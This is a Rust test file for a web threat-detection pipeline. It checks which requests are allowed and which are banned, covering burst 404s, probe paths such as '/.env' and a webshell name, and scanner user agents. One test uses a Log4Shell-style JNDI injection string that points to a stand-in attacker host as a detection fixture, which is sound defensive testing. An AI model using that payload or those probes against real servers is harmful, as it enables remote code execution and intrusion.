use sanalu::intelligence::{PipelineAction, ThreatPipeline};
use std::net::IpAddr;

#[test]
fn test_1_curl_clean_get_root_is_allowed() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.1".parse().unwrap();
    let action = pipeline.evaluate_request(ip, None, "curl/7.74.0", "GET", "/", 200, "");
    assert_eq!(action, PipelineAction::Allow);
}

#[test]
fn test_2_postman_typo_requests_under_threshold_allowed() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.2".parse().unwrap();
    for _ in 0..5 {
        let action = pipeline.evaluate_request(
            ip,
            None,
            "PostmanRuntime/7.28.4",
            "GET",
            "/api/v1/usres",
            404,
            "",
        );
        assert_eq!(action, PipelineAction::Allow);
    }
}

#[test]
fn test_3_curl_rapid_404s_triggers_burst_ban() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.3".parse().unwrap();
    for _ in 0..9 {
        let action =
            pipeline.evaluate_request(ip, None, "curl/7.74.0", "GET", "/missing-page", 404, "");
        assert_eq!(action, PipelineAction::Allow);
    }
    let action =
        pipeline.evaluate_request(ip, None, "curl/7.74.0", "GET", "/missing-page", 404, "");
    assert_eq!(
        action,
        PipelineAction::Ban {
            reason: "tool_error_burst:generic_tools".into(),
            permanent: false,
        }
    );
}

#[test]
fn test_4_curl_env_probe_is_banned_immediately() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.4".parse().unwrap();
    let action = pipeline.evaluate_request(ip, None, "curl/7.74.0", "GET", "/.env", 404, "");
    assert_eq!(
        action,
        PipelineAction::Ban {
            reason: "probe:generic_tools:tool_probe".into(),
            permanent: false,
        }
    );
}

#[test]
fn test_5_empty_ua_health_check_allowed() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.5".parse().unwrap();
    let action = pipeline.evaluate_request(ip, None, "-", "GET", "/health", 200, "");
    assert_eq!(action, PipelineAction::Allow);
}

#[test]
fn test_6_empty_ua_webshell_probe_is_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.6".parse().unwrap();
    let action = pipeline.evaluate_request(ip, None, "-", "GET", "/alfa.php", 404, "");
    assert_eq!(
        action,
        PipelineAction::Ban {
            reason: "probe:empty:tool_probe".into(),
            permanent: false,
        }
    );
}

#[test]
fn test_7_user_agent_jndi_exploit_is_permanently_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.7".parse().unwrap();
    let action = pipeline.evaluate_request(
        ip,
        None,
        "${jndi:ldap://evil.com/a}",
        "GET",
        "/",
        200,
        "",
    );
    assert_eq!(
        action,
        PipelineAction::Ban {
            reason: "header_exploit:jndi".into(),
            permanent: true,
        }
    );
}

#[test]
fn test_8_wp2shell_security_testing_bot_is_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.8".parse().unwrap();
    let action = pipeline.evaluate_request(ip, None, "wp2shell-rce/1.0", "GET", "/", 200, "");
    assert_eq!(
        action,
        PipelineAction::Ban {
            reason: "blocked_bot_category:security_testing".into(),
            permanent: false,
        }
    );
}

#[test]
fn test_9_mozlila_typosquat_security_testing_is_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.9".parse().unwrap();
    let action = pipeline.evaluate_request(ip, None, "Mozlila/5.0", "GET", "/", 200, "");
    assert_eq!(
        action,
        PipelineAction::Ban {
            reason: "blocked_bot_category:security_testing".into(),
            permanent: false,
        }
    );
}

#[test]
fn test_10_apple_authenticationservicescore_is_allowed() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.10".parse().unwrap();
    let action = pipeline.evaluate_request(
        ip,
        None,
        "AuthenticationServicesCore/1.0",
        "GET",
        "/",
        200,
        "",
    );
    assert_eq!(action, PipelineAction::Allow);
}

#[test]
fn test_tool_strike_window_reset() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.20".parse().unwrap();
    let res1 = pipeline.strike_tracker().record_tool_strike(ip, 10, 10, 100);
    assert_eq!(
        res1,
        sanalu::intelligence::StrikeResult::UnderThreshold {
            current: 1,
            max: 10,
        }
    );
    let res2 = pipeline.strike_tracker().record_tool_strike(ip, 10, 10, 120);
    assert_eq!(
        res2,
        sanalu::intelligence::StrikeResult::UnderThreshold {
            current: 1,
            max: 10,
        }
    );
}

#[test]
fn test_tool_strike_cleanup_stale() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "198.51.100.21".parse().unwrap();
    pipeline.strike_tracker().record_tool_strike(ip, 10, 10, 100);
    assert!(pipeline.strike_tracker().get_record(&ip).is_some());
    pipeline.cleanup_stale_strikes(105, 10);
    assert!(pipeline.strike_tracker().get_record(&ip).is_some());
    pipeline.cleanup_stale_strikes(115, 10);
    assert!(pipeline.strike_tracker().get_record(&ip).is_none());
}
